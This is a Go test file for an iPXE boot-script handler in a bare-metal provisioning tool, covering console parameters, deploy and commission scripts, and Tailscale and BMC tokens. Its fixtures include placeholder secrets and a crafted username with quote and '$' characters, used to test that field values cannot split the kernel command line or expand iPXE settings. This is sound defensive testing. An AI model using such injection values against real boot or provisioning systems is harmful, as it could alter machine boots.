package httpboot

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/bluesky-social/slagworks/internal/bmcreconcile"
	"github.com/bluesky-social/slagworks/internal/model"
)

func newTestProvider() *model.InMemoryProvider {
	return model.NewInMemoryProvider()
}

const testMAC = "52:54:00:aa:bb:01"

// testKernelParams is the console config the test provider models —
// a properly-configured device-type. There is no fallback console
// (unset = boot refused), so every helper sets one.
const testKernelParams = "console=ttyS1,115200n8"

// newTestProviderKnownMAC returns a provider with testMAC registered
// as a known, console-configured machine (eligible for deploy boot).
func newTestProviderKnownMAC() *model.InMemoryProvider {
	p := model.NewInMemoryProvider()
	id := uuid.New()
	p.Register(testMAC, id)
	p.SetKernelParams(id, testKernelParams)
	p.SetSystemUUID(id, uuid.NewSHA1(uuid.NameSpaceOID, append(id[:], []byte("system")...)).String())
	p.SetDeployOp(id, &model.Operation{
		ID:        uuid.NewSHA1(uuid.NameSpaceOID, append(id[:], []byte("deploy")...)),
		MachineID: id,
		Type:      model.OpDeploy,
		Status:    model.OpRunning,
	})
	return p
}

func TestBootHandler_NoImageConfig_UnknownMAC_ReturnsBootLocal(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	body := w.Body.String()
	if !strings.HasPrefix(body, "#!ipxe\n") {
		t.Fatalf("expected iPXE script header, got %q", body[:min(len(body), 50)])
	}
	if !strings.Contains(body, "boot-local") {
		t.Fatalf("expected boot-local for unknown MAC, got %q", body)
	}
}

// TestBootLocal_BIOSPlatform_ReturnsExit: a BIOS client (iPXE
// platform=pcbios) must get the bare `exit` boot-local (return to firmware
// -> next BBS device = disk), NOT sanboot, which hangs on AMI Aptio.
func TestBootLocal_BIOSPlatform_ReturnsExit(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01&platform=pcbios", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.HasPrefix(body, "#!ipxe\n") {
		t.Fatalf("expected iPXE header, got %q", body)
	}
	if !strings.Contains(body, "boot-local (BIOS exit") {
		t.Fatalf("expected BIOS exit boot-local, got %q", body)
	}
	if !strings.Contains(body, "\nexit\n") {
		t.Fatalf("expected bare `exit`, got %q", body)
	}
	if strings.Contains(body, "sanboot") {
		t.Fatalf("BIOS boot-local must NOT use sanboot (hangs on AMI Aptio), got %q", body)
	}
}

// TestBootLocal_UEFIPlatform_ReturnsSanboot: a UEFI client keeps the
// existing sanboot path (force-attaches the FAT driver on Aptio UEFI).
func TestBootLocal_UEFIPlatform_ReturnsSanboot(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01&platform=efi", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "sanboot --no-describe --drive ") {
		t.Fatalf("expected UEFI sanboot path, got %q", body)
	}
	if strings.Contains(body, "BIOS exit") {
		t.Fatalf("UEFI must not get the BIOS exit script, got %q", body)
	}
}

// TestBootLocal_AbsentPlatform_DefaultsToSanboot: an old iPXE binary (or a
// request without the platform param) must keep today's UEFI sanboot
// behavior byte-for-byte — the all-UEFI fleet relies on this during rollout.
func TestBootLocal_AbsentPlatform_DefaultsToSanboot(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "sanboot --no-describe --drive ") {
		t.Fatalf("absent platform must default to UEFI sanboot, got %q", body)
	}
	if strings.Contains(body, "BIOS exit") {
		t.Fatalf("absent platform must not get the BIOS exit script, got %q", body)
	}
}

func TestBootHandler_NoImageConfig_KnownMAC_ReturnsChainload(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "chainload complete") {
		t.Fatalf("expected chainload for known MAC with no image config, got %q", body)
	}
}

func TestBootHandler_NoMAC_StillReturns200(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 even without MAC, got %d", w.Code)
	}
}

func TestBootHandler_ContentType(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	ct := w.Header().Get("Content-Type")
	if ct != "text/plain" {
		t.Fatalf("expected Content-Type text/plain, got %q", ct)
	}
}

func TestBootHandler_WithImageConfig_ReturnsKernelInitrdScript(t *testing.T) {
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
	}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	body := w.Body.String()
	if !strings.HasPrefix(body, "#!ipxe\n") {
		t.Fatalf("expected iPXE script header, got %q", body[:min(len(body), 50)])
	}
	if !strings.Contains(body, "kernel") {
		t.Fatalf("expected 'kernel' command in script, got %q", body)
	}
	if !strings.Contains(body, "initrd") {
		t.Fatalf("expected 'initrd' command in script, got %q", body)
	}
	if !strings.Contains(body, "boot") {
		t.Fatalf("expected 'boot' command in script, got %q", body)
	}
	// The boot=slagworks hook (scripts/slagworks parse_cmdline) panics to a
	// shell if slagworks.server= is absent. The kernel-only path must pass it
	// just like deploy/commission do, or this boot dead-ends in a panic shell.
	if !strings.Contains(body, "boot=slagworks") {
		t.Fatalf("expected boot=slagworks on cmdline, got %q", body)
	}
	if !strings.Contains(body, "slagworks.server=") {
		t.Fatalf("kernel boot script missing slagworks.server= (hook panics without it), got %q", body)
	}
	if !strings.Contains(body, "slagworks.image=") {
		t.Fatalf("kernel boot script missing slagworks.image=, got %q", body)
	}
}

func TestBootHandler_WithImageConfig_KernelURLContainsVersion(t *testing.T) {
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     9999,
	}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "/files/images/noble/vmlinuz") {
		t.Fatalf("expected kernel URL with version 'noble', got %q", body)
	}
	if !strings.Contains(body, "/files/images/noble/initrd") {
		t.Fatalf("expected initrd URL with version 'noble', got %q", body)
	}
	if !strings.Contains(body, ":9999/") {
		t.Fatalf("expected port 9999 in URLs, got %q", body)
	}
}

// TestBootHandler_ConsoleArgs pins the consoleParams contract:
// the per-device value comes from MachineSnapshot.KernelParams (the
// slagworks_kernel_params device-type custom field), "none" opts the
// device out of any console= entirely (switches with no SOL), and there
// is NO fallback console for an unset field — a deploy/kernel boot is
// refused with an operator-facing error script, while a COMMISSION
// boots in broadcast/determination mode (every sweep-candidate tty) so
// the agent's console sweep can discover the real config empirically.
// These used to be three Skip()ed tests asserting a pre-437 ttyS0
// hardcode over a silent tty0+ttyS1 fallback; both are gone.
func TestBootHandler_ConsoleArgs(t *testing.T) {
	type tcase struct {
		name         string
		kernelParams string // provider value; "" = unset
		wantContains []string
		wantAbsent   []string
	}
	configured := []tcase{
		{
			name:         "device value drives the serial console",
			kernelParams: "console=ttyS0,115200n8",
			wantContains: []string{"console=tty0 console=ttyS0,115200n8", "kernel "},
			wantAbsent:   []string{"ttyS1"},
		},
		{
			name:         "none opts out of console params entirely",
			kernelParams: "none",
			wantContains: []string{"kernel "},
			wantAbsent:   []string{"console="},
		},
	}
	// Unset field: deploy and plain kernel boots refuse; commission
	// broadcasts on every candidate so the sweep can determine.
	unsetByMode := map[string]tcase{
		"chainload": {
			name:         "unset config refuses the kernel boot",
			wantContains: []string{"ERROR: no slagworks_kernel_params", "shell"},
			wantAbsent:   []string{"kernel "},
		},
		"deploy": {
			name:         "unset config refuses the deploy boot",
			wantContains: []string{"ERROR: no slagworks_kernel_params", "shell"},
			wantAbsent:   []string{"kernel "},
		},
		"commission": {
			name: "unset config commissions in broadcast determination mode",
			wantContains: []string{
				"console=tty0 console=ttyS0,115200n8 console=ttyS1,115200n8",
				"slagworks.mode=commission",
			},
			wantAbsent: []string{"ERROR"},
		},
	}
	for _, mode := range []struct {
		name          string
		deployMode    bool
		commissioning bool
	}{{"chainload", false, false}, {"deploy", true, false}, {"commission", true, true}} {
		for _, tc := range append(configured, unsetByMode[mode.name]) {
			t.Run(mode.name+"/"+tc.name, func(t *testing.T) {
				p := model.NewInMemoryProvider()
				id := uuid.New()
				p.Register(testMAC, id)
				if mode.commissioning {
					p.SetCommissioning(id)
				} else if mode.deployMode {
					p.SetSystemUUID(id, uuid.NewString())
					p.SetDeployOp(id, &model.Operation{
						ID: uuid.New(), MachineID: id, Type: model.OpDeploy, Status: model.OpRunning,
					})
				}
				if tc.kernelParams != "" {
					p.SetKernelParams(id, tc.kernelParams)
				}
				h := NewHandler(HandlerConfig{
					DefaultImage: "noble",
					HTTPPort:     8080,
					DeployMode:   mode.deployMode,
				}, p)
				req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
				w := httptest.NewRecorder()
				h.ServeHTTP(w, req)

				body := w.Body.String()
				for _, want := range tc.wantContains {
					if !strings.Contains(body, want) {
						t.Errorf("expected %q in boot script, got:\n%s", want, body)
					}
				}
				for _, absent := range tc.wantAbsent {
					if strings.Contains(body, absent) {
						t.Errorf("expected %q ABSENT from boot script, got:\n%s", absent, body)
					}
				}
			})
		}
	}
}

func TestBootHandler_WithImageConfig_NoChainloadMarker(t *testing.T) {
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
	}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if strings.Contains(body, "chainload complete") {
		t.Fatalf("image boot script should not contain Phase 0 chainload marker")
	}
}

func TestBootHandler_DeployMode_ReturnsOverlayScript(t *testing.T) {
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	body := w.Body.String()
	if !strings.HasPrefix(body, "#!ipxe\n") {
		t.Fatalf("expected iPXE script header, got %q", body[:min(len(body), 50)])
	}
	if !strings.Contains(body, "slagworks.server=") {
		t.Fatalf("expected slagworks.server kernel arg, got %q", body)
	}
	if !strings.Contains(body, "slagworks.image=noble") {
		t.Fatalf("expected slagworks.image kernel arg, got %q", body)
	}
	if strings.Contains(body, "overlay.cpio") {
		t.Fatalf("overlay.cpio should be pre-concatenated into initrd, not served separately, got %q", body)
	}
	if !strings.Contains(body, "slagworks: deploy boot") {
		t.Fatalf("expected deploy boot echo marker, got %q", body)
	}
	// boot=slagworks makes stock /init source our BOOT hook; ip=dhcp makes it
	// run configure_networking. Both are load-bearing for the upstream-init
	// boot path (no custom /init replacement).
	if !strings.Contains(body, "boot=slagworks") {
		t.Fatalf("expected boot=slagworks kernel arg, got %q", body)
	}
	if !strings.Contains(body, "ip=dhcp") {
		t.Fatalf("expected ip=dhcp kernel arg, got %q", body)
	}
	if strings.Count(body, "initrd ") != 1 {
		t.Fatalf("expected exactly 1 initrd line (pre-concatenated), got %q", body)
	}
}

func TestDeployBootScript_ContainsMachineAndOpID(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	opID := uuid.New()
	traceID := uuid.New()
	p.SetDeployOp(machineID, &model.Operation{
		ID:        opID,
		MachineID: machineID,
		TraceID:   traceID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.machine="+machineID.String()) {
		t.Fatalf("expected slagworks.machine=%s in boot script, got %q", machineID.String(), body)
	}
	if !strings.Contains(body, "slagworks.op="+opID.String()) {
		t.Fatalf("expected slagworks.op=%s in boot script, got %q", opID.String(), body)
	}
	if !strings.Contains(body, "slagworks.trace="+traceID.String()) {
		t.Fatalf("expected slagworks.trace=%s in boot script, got %q", traceID.String(), body)
	}
}

// TestDeployBootScript_TailscaleTokens: when the deploy op's params carry a
// tailscale_runtime block (minted by global), the boot script emits the
// auth-key + hostname cmdline tokens the agent reads to enroll onto the tailnet.
func TestDeployBootScript_TailscaleTokens(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"destructive":true,"tailscale_runtime":{"auth_key":"tskey-auth-K9","hostname":"oob-gw-3-pop2","tags":["tag:pop2"]}}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{DefaultImage: "noble", HTTPPort: 8080, DeployMode: true}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.tailscale_authkey=tskey-auth-K9") {
		t.Errorf("expected tailscale_authkey token, got %q", body)
	}
	if !strings.Contains(body, "slagworks.tailscale_hostname=oob-gw-3-pop2") {
		t.Errorf("expected tailscale_hostname token, got %q", body)
	}
	// The block composes with other params (destructive still emitted).
	if !strings.Contains(body, "slagworks.destructive") {
		t.Errorf("expected destructive token alongside tailscale, got %q", body)
	}
}

// TestDeployBootScript_NoTailscaleWhenAbsent: a deploy op with no
// tailscale_runtime block emits no tailscale tokens (enrollment skipped). This
// is the path for deploys global didn't mint a key for (tests, pop3, minter
// unconfigured) — the agent then no-ops the enrollment step.
func TestDeployBootScript_NoTailscaleWhenAbsent(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"destructive":true}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{DefaultImage: "noble", HTTPPort: 8080, DeployMode: true}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if strings.Contains(body, "slagworks.tailscale_authkey") {
		t.Errorf("expected no tailscale_authkey token when block absent, got %q", body)
	}
	if strings.Contains(body, "slagworks.tailscale_hostname") {
		t.Errorf("expected no tailscale_hostname token when block absent, got %q", body)
	}
}

// deployScriptFor serves the deploy boot script for testMAC with the given
// op params; setup tweaks the provider first (nil for none).
func deployScriptFor(t *testing.T, params string, setup func(p *model.InMemoryProvider, id uuid.UUID)) string {
	t.Helper()
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(params),
	})
	if setup != nil {
		setup(p, machineID)
	}
	h := NewHandler(HandlerConfig{DefaultImage: "noble", HTTPPort: 8080, DeployMode: true}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	return w.Body.String()
}

// TestDeployBootScript_BMCAdminUserFromOpRuntime: the deploy op's bmc_runtime
// carries the device's bmc-creds-admin entry (resolved by global at op
// creation). Its USERNAME rides the cmdline so the agent's in-band reconcile
// can refuse when that account isn't at slot 2; the password never does.
func TestDeployBootScript_BMCAdminUserFromOpRuntime(t *testing.T) {
	body := deployScriptFor(t, `{"bmc_runtime":{"expected_chassis_serial":"SN1","username":"ADMIN","password":"s3cr3t-admin","extra_config":{}}}`, nil)
	if !strings.Contains(body, " "+bmcreconcile.AdminUserKernelArg+"=ADMIN") {
		t.Errorf("expected the admin username token, got %q", body)
	}
	if strings.Contains(body, "s3cr3t-admin") {
		t.Fatalf("admin password leaked onto the cmdline: %q", body)
	}
}

// TestDeployBootScript_BMCAdminUserEncoded: a username with whitespace,
// quotes, or '$' must not split the kernel cmdline or trigger iPXE settings
// expansion; it is emitted encoded and decodes back exactly.
func TestDeployBootScript_BMCAdminUserEncoded(t *testing.T) {
	const name = `ad min"$x`
	raw, _ := json.Marshal(model.OpParams{BMCRuntime: &model.BMCRuntime{Username: name, Password: "pw", ExtraConfig: map[string]any{}}})
	body := deployScriptFor(t, string(raw), nil)
	token := bmcreconcile.AdminUserKernelArg + "=" + bmcreconcile.EncodeAdminUserArg(name)
	if !strings.Contains(body, " "+token) {
		t.Fatalf("expected encoded token %q, got %q", token, body)
	}
	if strings.Contains(body, name) {
		t.Errorf("raw username reached the boot script: %q", body)
	}
	value := strings.Fields(body[strings.Index(body, token):])[0][len(bmcreconcile.AdminUserKernelArg)+1:]
	if got, err := bmcreconcile.DecodeAdminUserArg(value); err != nil || got != name {
		t.Errorf("token %q decodes to %q (err %v), want %q", value, got, err, name)
	}
}

// TestDeployBootScript_BMCAdminUserFromSnapshot: a deploy whose transport
// isn't the BMC (--via pdu: pdu_runtime, no bmc_runtime) still runs the
// in-band reconcile, so the username comes from the snapshot's admin-entry
// stamp instead.
func TestDeployBootScript_BMCAdminUserFromSnapshot(t *testing.T) {
	body := deployScriptFor(t, `{"pdu_runtime":{"outlets":[{"pdu_host":"10.0.0.9","outlet":3}]}}`,
		func(p *model.InMemoryProvider, id uuid.UUID) { p.SetBMCUser(id, "root") })
	if !strings.Contains(body, " "+bmcreconcile.AdminUserKernelArg+"=root") {
		t.Errorf("expected the snapshot admin username token, got %q", body)
	}
}

// TestDeployBootScript_NoBMCAdminUser: no admin entry anywhere (or an AMT
// machine, which skips the IPMI reconcile) omits the token; the agent then
// logs that the slot-2 gate was skipped.
func TestDeployBootScript_NoBMCAdminUser(t *testing.T) {
	if body := deployScriptFor(t, `{"destructive":true}`, nil); strings.Contains(body, bmcreconcile.AdminUserKernelArg) {
		t.Errorf("no admin entry must omit the token, got %q", body)
	}
	amt := deployScriptFor(t, `{"amt_runtime":{"host":"10.0.0.5","username":"admin","password":"pw"}}`,
		func(p *model.InMemoryProvider, id uuid.UUID) { p.SetAMT(id, true); p.SetBMCUser(id, "admin") })
	if strings.Contains(amt, bmcreconcile.AdminUserKernelArg) {
		t.Errorf("an AMT machine must not get the token, got %q", amt)
	}
}

// TestDeployBootScript_TailscaleHostnameRequiresKey: a half-populated block
// (hostname but no auth key) emits NO tokens — the agent must never get a
// hostname-only cmdline it would misread as "enroll".
func TestDeployBootScript_TailscaleHostnameRequiresKey(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"tailscale_runtime":{"hostname":"oob-gw-3-pop2"}}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{DefaultImage: "noble", HTTPPort: 8080, DeployMode: true}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if strings.Contains(body, "slagworks.tailscale_hostname") {
		t.Errorf("hostname token emitted without an auth key, got %q", body)
	}
}

func TestCommissionBootScript_ContainsTraceID(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	// Force the boot path to commission by putting the machine into
	// statusCommissioning. The handler picks BootCommission for that
	// state per InMemoryProvider.BootActionForMAC.
	p.SetCommissioning(machineID)
	opID := uuid.New()
	traceID := uuid.New()
	p.SetCommissionOp(machineID, &model.Operation{
		ID:        opID,
		MachineID: machineID,
		TraceID:   traceID,
		Type:      model.OpCommission,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.mode=commission") {
		t.Fatalf("expected commission mode in boot script, got %q", body)
	}
	if !strings.Contains(body, "boot=slagworks") {
		t.Fatalf("expected boot=slagworks kernel arg in commission boot script, got %q", body)
	}
	if !strings.Contains(body, "ip=dhcp") {
		t.Fatalf("expected ip=dhcp kernel arg in commission boot script, got %q", body)
	}
	if !strings.Contains(body, "slagworks.trace="+traceID.String()) {
		t.Fatalf("expected slagworks.trace=%s in commission boot script, got %q", traceID.String(), body)
	}
	if !strings.Contains(body, "slagworks.op="+opID.String()) {
		t.Fatalf("expected slagworks.op=%s in commission boot script, got %q", opID.String(), body)
	}
}

// TestBootHandler_ReportsIPXELoadedPhase is the worker-side fix: when
// iPXE fetches its boot script, the handler reports the ipxe_loaded phase for
// the active boot-driving op — for COMMISSION as well as deploy, so the watch
// TUI's lifecycle pane animates the boot prefix for commission instead of
// sitting all-pending until the agent's first report. Drives both op types
// through the same boot path and asserts the phase report is emitted with the
// right op/machine IDs.
func TestBootHandler_ReportsIPXELoadedPhase(t *testing.T) {
	cases := []struct {
		name       string
		commission bool
	}{
		{"commission", true},
		{"deploy", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := newTestProviderKnownMAC()
			machineID, _ := p.MachineIDForMAC(testMAC)
			opID := uuid.New()
			op := &model.Operation{
				ID:        opID,
				MachineID: machineID,
				Status:    model.OpClaimed,
				Params:    json.RawMessage(`{}`),
			}
			if tc.commission {
				p.SetCommissioning(machineID)
				op.Type = model.OpCommission
				p.SetCommissionOp(machineID, op)
			} else {
				op.Type = model.OpDeploy
				p.SetDeployOp(machineID, op)
			}

			h := NewHandler(HandlerConfig{
				DefaultImage: "noble",
				HTTPPort:     8080,
				DeployMode:   true,
			}, p)
			req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
			h.ServeHTTP(httptest.NewRecorder(), req)

			var got *model.ProgressReport
			for i := range p.ProgressReports {
				if p.ProgressReports[i].Phase == "ipxe_loaded" {
					got = &p.ProgressReports[i]
					break
				}
			}
			if got == nil {
				t.Fatalf("no ipxe_loaded phase report emitted for %s boot; reports=%+v",
					tc.name, p.ProgressReports)
			}
			if got.OperationID != opID.String() {
				t.Errorf("ipxe_loaded report OperationID = %q, want %q", got.OperationID, opID.String())
			}
			if got.MachineID != machineID.String() {
				t.Errorf("ipxe_loaded report MachineID = %q, want %q", got.MachineID, machineID.String())
			}
		})
	}
}

func TestDeployBootScript_DestructiveFlag(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	opID := uuid.New()
	p.SetDeployOp(machineID, &model.Operation{
		ID:        opID,
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"destructive":true}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.destructive") {
		t.Fatalf("expected slagworks.destructive in boot script, got %q", body)
	}
	if strings.Contains(body, "slagworks.force") {
		t.Fatalf("expected slagworks.force to be gone (renamed to destructive), got %q", body)
	}
	if strings.Contains(body, "slagworks.wipe_all_disks") {
		t.Fatalf("expected no slagworks.wipe_all_disks without the param, got %q", body)
	}
}

func TestDeployBootScript_WipeAllDisksFlag(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"destructive":true,"wipe_all_disks":true}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.destructive") {
		t.Fatalf("expected slagworks.destructive in boot script, got %q", body)
	}
	if !strings.Contains(body, "slagworks.wipe_all_disks") {
		t.Fatalf("expected slagworks.wipe_all_disks in boot script, got %q", body)
	}
}

func TestDeployBootScript_RecoveryFlag(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{"recovery":true}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.recovery") {
		t.Fatalf("expected slagworks.recovery in boot script, got %q", body)
	}
}

func TestDeployBootScript_NoRecoveryWithoutFlag(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if strings.Contains(body, "slagworks.recovery") {
		t.Fatalf("expected no slagworks.recovery without flag, got %q", body)
	}
}

func TestDeployBootScript_NoDestructiveWithoutFlag(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	opID := uuid.New()
	p.SetDeployOp(machineID, &model.Operation{
		ID:        opID,
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})
	p.SetSystemUUID(machineID, "550e8400-e29b-41d4-a716-446655440000")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if strings.Contains(body, "slagworks.destructive") {
		t.Fatalf("expected no slagworks.destructive without flag, got %q", body)
	}
	if strings.Contains(body, "slagworks.force") {
		t.Fatalf("expected no slagworks.force, got %q", body)
	}
}

func TestDeployBootScript_ExpectUUID(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	testUUID := "550e8400-e29b-41d4-a716-446655440000"
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})
	p.SetSystemUUID(machineID, testUUID)

	h := NewHandler(HandlerConfig{
